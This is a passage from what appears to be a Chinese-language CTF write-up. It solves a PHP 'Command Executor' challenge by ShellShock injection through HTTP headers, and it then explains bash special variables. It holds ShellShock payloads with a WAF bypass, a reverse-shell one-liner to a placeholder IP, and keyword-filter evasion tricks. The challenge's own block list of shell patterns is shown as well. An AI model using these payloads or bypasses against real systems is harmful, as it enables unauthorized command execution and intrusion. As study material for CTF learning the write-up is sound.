class="line">        foreach($a as $key =&gt; $val) &#123;</div><div class="line">            waf($key);</div><div class="line">            waf($val);</div><div class="line">        &#125;</div><div class="line">    &#125; else &#123;</div><div class="line">        foreach($black_list as $b) &#123;</div><div class="line">            if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123;</div><div class="line">                fuck(&quot;$b detected! exit now.&quot;);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">waf($_SERVER);</div><div class="line">waf($_GET);</div><div class="line">waf($_POST);</div><div class="line"></div><div class="line">function execute($cmd, $shell=&apos;bash&apos;) &#123;</div><div class="line">    system(sprintf(&apos;%s -c %s&apos;, $shell, escapeshellarg($cmd)));</div><div class="line">&#125;</div><div class="line"></div><div class="line">foreach($_SERVER as $key =&gt; $val) &#123;</div><div class="line">    if(substr($key, 0, 5) === &apos;HTTP_&apos;) &#123;</div><div class="line">        putenv(&quot;$key=$val&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$page = &apos;&apos;;</div><div class="line"></div><div class="line">if(isset($_GET[&apos;func&apos;])) &#123;</div><div class="line">    $page = $_GET[&apos;func&apos;];</div><div class="line">    if(strstr($page, &apos;..&apos;) !== false) &#123;</div><div class="line">        $page = &apos;&apos;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($page &amp;&amp; strlen($page) &gt; 0) &#123;</div><div class="line">    try &#123;</div><div class="line">        include(&quot;$page.php&quot;);</div><div class="line">    &#125; catch (Exception $e) &#123;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function render_default() &#123; ?&gt;</div><div class="line">&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;</div><div class="line"></div><div class="line">&lt;img src=&quot;windows-run.jpg&quot; alt=&quot;command executor&quot;&gt;</div><div class="line">&lt;?php &#125;</div><div class="line">?&gt;&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">  &lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">    &lt;title&gt;Command Executor&lt;/title&gt;</div><div class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt;</div><div class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;comic-neue/font.css&quot; media=&quot;all&quot;&gt;</div><div class="line">    &lt;style&gt;</div><div class="line">      nav &#123; margin-bottom: 1rem; &#125;</div><div class="line">      img &#123; max-width: 100%; &#125;</div><div class="line">    &lt;/style&gt;</div><div class="line">  &lt;/head&gt;</div><div class="line">  &lt;body&gt;</div><div class="line">    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</div><div class="line">      &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt;</div><div class="line"></div><div class="line">      &lt;ul class=&quot;navbar-nav&quot;&gt;</div><div class="line">&lt;?php foreach($pages as list($file, $title)): ?&gt;</div><div class="line">        &lt;li class=&quot;nav-item&quot;&gt;</div><div class="line">          &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt;</div><div class="line">        &lt;/li&gt;</div><div class="line">&lt;?php endforeach; ?&gt;</div><div class="line">      &lt;/ul&gt;</div><div class="line">    &lt;/nav&gt;</div><div class="line"></div><div class="line">    &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable(&apos;render&apos;)) render(); else render_default(); ?&gt;&lt;/div&gt;</div><div class="line">  &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p><code>man.php</code>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</div><div class="line">    $file = <span class="string">'man'</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</div><div class="line">        $file = (string)$_GET[<span class="string">'file'</span>];</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^[\w\-]+$/'</span>, $file) !== <span class="number">1</span>) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Invalid file name!&lt;/pre&gt;'</span>;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;Online documents&lt;/h1&gt;'</span>;</div><div class="line"></div><div class="line">    $cmds = [</div><div class="line">        <span class="string">'bash'</span>, <span class="string">'ls'</span>, <span class="string">'cp'</span>, <span class="string">'mv'</span></div><div class="line">    ];</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;ul&gt;'</span>;</div><div class="line">    <span class="keyword">foreach</span>($cmds <span class="keyword">as</span> $cmd) &#123;</div><div class="line">        printf(<span class="string">'&lt;li&gt;&lt;a href="index.php?func=man&amp;file=%s"&gt;%1$s&lt;/a&gt;&lt;/li&gt;'</span>, $cmd);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/ul&gt;'</span>;</div><div class="line"></div><div class="line">    printf(<span class="string">'&lt;h2&gt;$ man %s&lt;/h2&gt;'</span>, htmlentities($file));</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">    execute(sprintf(<span class="string">'man %s | cat'</span>, escapeshellarg($file)));</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><code>untar.php</code>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;h1&gt;Tar file tester&lt;/h1&gt;</div><div class="line"></div><div class="line">&lt;p&gt;Please upload a tar file to test&lt;/p&gt;</div><div class="line"></div><div class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"index.php?func=untar"</span> method=<span class="string">"POST"</span>&gt;</div><div class="line">  &lt;input type=<span class="string">"file"</span> name=<span class="string">"tarfile"</span> id=<span class="string">"tarfile"</span>&gt;</div><div class="line">  &lt;input class="btn btn-primary" type="submit" value="Upload &amp;amp; Test"&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'tarfile'</span>])) &#123;</div><div class="line">        printf(<span class="string">'&lt;h2&gt;$ tar -tvf %s&lt;/h2&gt;'</span>, htmlentities($_FILES[<span class="string">'tarfile'</span>][<span class="string">'name'</span>]));</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">        execute(sprintf(<span class="string">'tar -tvf %s 2&gt;&amp;1'</span>, escapeshellarg($_FILES[<span class="string">'tarfile'</span>][<span class="string">'tmp_name'</span>])));</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><code>ls.php</code>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</div><div class="line">    $file = <span class="string">'.'</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</div><div class="line">        $file = (string)$_GET[<span class="string">'file'</span>];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;Dictionary Traversal&lt;/h1&gt;'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;ul&gt;'</span>;</div><div class="line">    $dirs = [<span class="string">'.'</span>, <span class="string">'..'</span>, <span class="string">'../..'</span>, <span class="string">'/etc/passwd'</span>];</div><div class="line">    <span class="keyword">foreach</span>($dirs <span class="keyword">as</span> $dir) &#123;</div><div class="line">        printf(<span class="string">'&lt;li&gt;&lt;a href="index.php?func=ls&amp;file=%s"&gt;%1$s&lt;/a&gt;&lt;/li&gt;'</span>, $dir);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/ul&gt;'</span>;</div><div class="line"></div><div class="line">    printf(<span class="string">'&lt;h2&gt;$ ls %s&lt;/h2&gt;'</span>, htmlentities($file));</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">    execute(sprintf(<span class="string">'ls -l %s'</span>, escapeshellarg($file)));</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><code>cmd.php</code>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</div><div class="line">    $cmd = <span class="string">''</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) &#123;</div><div class="line">        $cmd = (string)$_GET[<span class="string">'cmd'</span>];</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;h1&gt;Command Execution&lt;/h1&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;ul&gt;'</span>;</div><div class="line">    $cmds = [<span class="string">'ls'</span>, <span class="string">'env'</span>];</div><div class="line">    <span class="keyword">foreach</span>($cmds <span class="keyword">as</span> $c) &#123;</div><div class="line">        printf(<span class="string">'&lt;li&gt;&lt;a href="index.php?func=cmd&amp;cmd=%s"&gt;%1$s&lt;/a&gt;&lt;/li&gt;'</span>, $c);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/ul&gt;'</span>;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"GET"</span>&gt;</div><div class="line">  &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"func"</span> value=<span class="string">"cmd"</span>&gt;</div><div class="line">  &lt;div class="input-group"&gt;</div><div class="line">    &lt;input class="form-control" type="text" name="cmd" id="cmd"&gt;</div><div class="line">    &lt;div class="input-group-append"&gt;</div><div class="line">      &lt;input class="btn btn-primary" type="submit" value="Execute"&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  &lt;/div&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;script&gt;cmd.focus();&lt;/script&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>(strlen($cmd) &gt; <span class="number">0</span>) &#123;</div><div class="line">        printf(<span class="string">'&lt;h2&gt;$ %s&lt;/h2&gt;'</span>, htmlentities($cmd));</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">        <span class="keyword">switch</span> ($cmd) &#123;</div><div class="line">        <span class="keyword">case</span> <span class="string">'env'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'ls'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'ls -l'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'ls -al'</span>:</div><div class="line">            execute($cmd);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'cat flag'</span>:</div><div class="line">            <span class="keyword">echo</span> <span class="string">'&lt;img src="cat-flag.png" alt="cat flag"&gt;'</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            printf(<span class="string">'%s: command not found'</span>, htmlentities($cmd));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>接下来我们就可以利用<code>ls.php</code>来找<code>flag</code>了，因为<code>ls.php</code>没什么过滤，所以用<code>func=ls&amp;file=../../../</code>可以发现根目录下的文件</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pzce57rj228016s4a5.jpg" alt=""></p>
+<p>接下来就是考虑怎么去读了，<code>man.php</code>因为有<code>preg_match(&#39;/^[\w\-]+$/&#39;, $file) !== 1</code>限制得比较死，<code>untar.php</code>貌似只有<code>tar -tvf</code>并没有什么用处，只有<code>cmd.php</code>给出了一个比较不太寻常的<code>env</code>这个命令，其实这样也算是提示得比较明显了，比较容易让人想到也可以比较容易搜到<code>ShellShock</code>漏洞，并且在<code>index.php</code>中发现有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">$black_list = [</div><div class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></div><div class="line">];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $black_list;</div><div class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</div><div class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</div><div class="line">            waf($key);</div><div class="line">            waf($val);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</div><div class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</div><div class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">waf($_SERVER);</div><div class="line">waf($_GET);</div><div class="line">waf($_POST);</div><div class="line"></div><div class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</div><div class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</div><div class="line">        putenv(<span class="string">"$key=$val"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>关键就在<code>putenv</code>函数，由于<code>ShellShock</code>漏洞 padyload 需要参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">env x=<span class="string">'() &#123; :;&#125;; echo vulnerable'</span> bash -c <span class="string">"echo this is a test"</span></div></pre></td></tr></table></figure>
+<p>我们就可以利用<code>putenv</code>实现参数传递，直接设置<code>User-agent: () { :;}; echo 222222</code>，发现被 waf </p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08qc2c4wpj219007staa.jpg" alt=""></p>
+<p>分析 waf 结合漏洞成因，我们可以在最后的<code>};</code>中间添加一个空格绕过，设置<code>User-Agent: () { :;} ; echo 222222</code>，成功发现输出 22222 ，我们也可以使用<code>() { _; } &gt;_[$($())] { whoami; }</code>这个 payload</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08rmk4tuyj21ik14cagc.jpg" alt=""></p>
+<p>发现当前用户为<code>www-data</code>，而我们之前发现根目录<code>flag</code>的权限为<code>-r--------   1 flag root   37 Jan  9  2018 flag</code>，所以不能直接读取，但是有一个<code>flag-reader</code>与<code>flag-reader.c</code>的文件，这应该是题目提示了。因为<code>index.php</code>又把<code>flag</code>关键字屏蔽了，我们也不能直接读取<code>flag-reader.c</code>，但是我们这里可以利用通配符读取，例如使用<code>fla*.c</code></p>
+<p>使用<code>() { _; } &gt;_[$($())] { cat /fla*.c; }</code>得到<code>flag-reader.c</code>源码</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08rqwh4dgj21i0148n4k.jpg" alt=""></p>
+<p>Flag-reader.c:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">char</span> buff[<span class="number">4096</span>], rnd[<span class="number">16</span>], val[<span class="number">16</span>];</div><div class="line">	<span class="keyword">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class="keyword">sizeof</span>(rnd), <span class="number">0</span>) != <span class="keyword">sizeof</span>(rnd)) &#123;</div><div class="line">		write(<span class="number">1</span>, <span class="string">"Not enough random\n"</span>, <span class="number">18</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	setuid(<span class="number">1337</span>);</div><div class="line">	seteuid(<span class="number">1337</span>);</div><div class="line">	alarm(<span class="number">1</span>);</div><div class="line">	write(<span class="number">1</span>, &amp;rnd, <span class="keyword">sizeof</span>(rnd));</div><div class="line">	read(<span class="number">0</span>, &amp;val, <span class="keyword">sizeof</span>(val));</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(rnd, val, <span class="keyword">sizeof</span>(rnd)) == <span class="number">0</span>) &#123;</div><div class="line">		<span class="keyword">int</span> fd = open(argv[<span class="number">1</span>], O_RDONLY);</div><div class="line">		<span class="keyword">if</span>(fd &gt; <span class="number">0</span>) &#123;</div><div class="line">			<span class="keyword">int</span> s = read(fd, buff, <span class="number">1024</span>);</div><div class="line">			<span class="keyword">if</span>(s &gt; <span class="number">0</span>) &#123;</div><div class="line">				write(<span class="number">1</span>, buff, s);</div><div class="line">			&#125;</div><div class="line">			close(fd);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			write(<span class="number">1</span>, <span class="string">"Can not open file\n"</span>, <span class="number">18</span>);</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		write(<span class="number">1</span>, <span class="string">"Wrong response\n"</span>, <span class="number">16</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>使用<code>bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</code>直接反弹 shell </p>
+<p>运行<code>flag-reader</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g09blmqqltj20su0neu0x.jpg" alt=""></p>
+<p>审计一下这段代码，大致是输出一串随机数，然后在1s之内又要输入进去，否则就<code>write(1, &quot;Wrong response\n&quot;, 16);</code>…</p>
+<p>然而我在回弹 shell 之后，利用<code>/tmp</code>可写的权限，貌似有点小问题，一旦<code>cat /tmp/zedd</code>，链接就断掉了，无奈只能找其他文件夹，发现<code>/run/lock</code>与<code>/var/tmp</code>均可读可写，使用<code>/flag-reader flag &gt; /run/lock/zedd &lt; /run/lock/zedd</code>写入 flag</p>
+<p>反弹 shell 使用<code>cat</code>非常容易断掉，最好使用执行的方式，最后得到 flag</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g09c248q7uj21i613wgvd.jpg" alt=""></p>
+<h2 id="上篇的解释与补充"><a href="#上篇的解释与补充" class="headerlink" title="上篇的解释与补充"></a>上篇的解释与补充</h2><h3 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h3><p>这里再对上篇进行一定的补充与解释。</p>
+<h4 id="n"><a href="#n" class="headerlink" title="$n"></a>$n</h4><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>$0</td>
+<td>当前脚本的文件名</td>
+</tr>
+<tr>
+<td>$n</td>
+<td>传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第二个参数是$2(0&lt;n&lt;9)</td>
+</tr>
+<tr>
+<td>${n}</td>
+<td>9&lt;n时需要加上大括号</td>
+</tr>
+</tbody>
+</table>
+<p>例如，脚本文件如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"File Name: <span class="variable">$0</span>"</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"First Parameter : <span class="variable">$1</span>"</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"First Parameter : <span class="variable">$2</span>"</span></div></pre></td></tr></table></figure>
+<p>执行脚本文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ./test.sh Hello Zedd</div><div class="line">File Name: ./test.sh</div><div class="line">First Parameter : Hello</div><div class="line">Second Parameter : Zedd</div></pre></td></tr></table></figure>
+<p>而当没有参数的时候，<code>$n</code>就为空，所以我们可以用<code>cat /fl$1ag</code>这样绕过关键字过滤，并且在 bash 环境下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="variable">$0</span></div><div class="line">bash</div></pre></td></tr></table></figure>
+<p>所以我们可以使用这样的 payload ，可以用在 bash 这个关键字过滤但是有需要用到 bash 的情况下，前提是环境用的是 bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ &#123;<span class="built_in">printf</span>,<span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>&#125;|<span class="variable">$0</span></div><div class="line">flag&#123;xxx&#125;</div></pre></td></tr></table></figure>
+<h4 id="IFS"><a href="#IFS" class="headerlink" title="$IFS"></a>$IFS</h4><p>IFS(Internal Field Seprator) ，内部域分隔符，Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。</p>
+<p>而 IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="variable">$IFS</span></div><div class="line"></div><div class="line">$ <span class="built_in">echo</span> <span class="string">"<span class="variable">$IFS</span>"</span> | od -b</div><div class="line">0000000 040 011 012 012</div><div class="line">0000004</div></pre></td></tr></table></figure>
+<p>我们可以看到直接输出IFS是看不到的，把它转化为二进制就可以看到了，”040”是空格，”011”是Tab，”012”是换行符”\n” 。最后一个 012 是因为 echo 默认是会换行的。</p>
+<h4 id=""><a href="#" class="headerlink" title="$?"></a>$?</h4><p>上个命令的退出状态，或函数的返回值。退出状态是一个数字，一般情况下，大部分命令执行成功会返回0，失败返回1。不过，也有一些命令返回其他值，表示不同类型的错误。</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title="$"></a>$</h4><p>当前 Shell 进程 ID。对于 Shell 脚本，就是这些脚本所在的进程 ID。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> $$</div><div class="line">75576</div></pre></td></tr></table></figure>
+<h4 id="-2"><a href="#-2" class="headerlink" title="$"></a>$</h4><p>传递给脚本或函数的参数个数。</p>
+<p>脚本文件内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"Total Number of Parameters : <span class="variable">$#</span>"</span></div></pre></td></tr></table></figure>
+<p>执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ./test.sh Hello Zedd</div><div class="line">Total Number of Parameters : 2</div></pre></td></tr></table></figure>
+<h4 id="与"><a href="#与" class="headerlink" title="\$*与\$@"></a>\$*与\$@</h4><p>都是传递给脚本或函数的所有参数。</p>
+<p>脚本文件内容：</p>
